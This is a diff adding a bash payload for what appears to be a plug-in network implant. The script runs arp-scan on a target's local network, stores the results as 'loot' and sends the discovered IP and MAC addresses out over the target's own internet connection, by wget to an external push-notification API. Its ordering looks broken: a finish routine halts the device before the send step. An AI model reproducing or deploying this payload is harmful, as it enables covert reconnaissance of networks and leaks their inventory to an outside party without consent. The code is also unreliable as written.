@@ -1,0 +1,63 @@
+#!/bin/bash
+# This payload runs arpscan and sends the info via push message to your iPhone.
+# The Shark uses the targets LAN -> WAN -> to send the message (using wget)
+#
+# Download the prowl app from Apples appstore (https://itunes.apple.com/us/app/prowl-easy-push-notifications/id320876271?mt=8)
+# and generate the api key here:  https://www.prowlapp.com/api_settings.php 
+#
+# Then just fill the API key in to the script below where it says "xxxx-YOUR-API-KEY-HERE-xxxx"
+#
+# Replace the wget call below with the syntax for Pushover (https://pushover.net/api) or whatever other vendor you prefer if you use an android.
+# 
+# Enable the two next lines to run with debug and log to /root/loot/debug.log
+#exec &> >(/usr/bin/tee -a /root/loot/debug.log)
+#set -x
+#
+LOOT_DIR=/root/loot/arp
+ARP_SCAN='/usr/bin/arp-scan --localnet --interface=eth0 --ignoredups'
+#
+function finish() {
+ LED CLEANUP
+ wait $1
+ kill $1 &> /dev/null
+ sync
+ sleep 1
+ LED FINISH
+ sleep 1
+ halt
+}
+function prowl() {
+ TITLE="SHARK"
+ EVENT="${1:-Missing}"
+ DESCR="${2:-Missing}"
+ /bin/wget --post-data "apikey=xxxxxxxxxxx-YOUR-API-KEY-HERE-xxxxxxxxxx&application=${TITLE}&event=${EVENT}&description=${DESCR}" -O - http://api.prowlapp.com/publicapi/add
+}
+function find_subnet() {
+ SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
+}
+function setup() {
+ LED SETUP
+ mkdir -p ${LOOT_DIR} > /dev/null
+ NETMODE DHCP_CLIENT
+ while [ -z "${SUBNET}" ]; do
+  sleep 1 && find_subnet
+ done
+}
+function run() {
+ setup
+ LED ATTACK
+ ${ARP_SCAN} >/root/loot/arp/arp.scan 2>/root/loot/arp/arp.error &
+ tpid=$!
+ finish $tpid
+ if [ -s ${LOOT_DIR}/arp.scan ]; then 
+  prowl "ARP" "$(cat ${LOOT_DIR}/arp.scan|grep -v ^$|grep -v ^Ending|grep -v ^Starting|grep -v ^Interface|awk '{print $1,$2}')"
+ else
+  if [ -s ${LOOT_DIR}/arp.error ]; then
+   ERROR="$(cat ${LOOT_DIR}/arp.error)"
+  else
+   ERROR="Unknown error"
+  fi 
+  prowl "ARP" "${ERROR}"
+ fi
+}
+run &
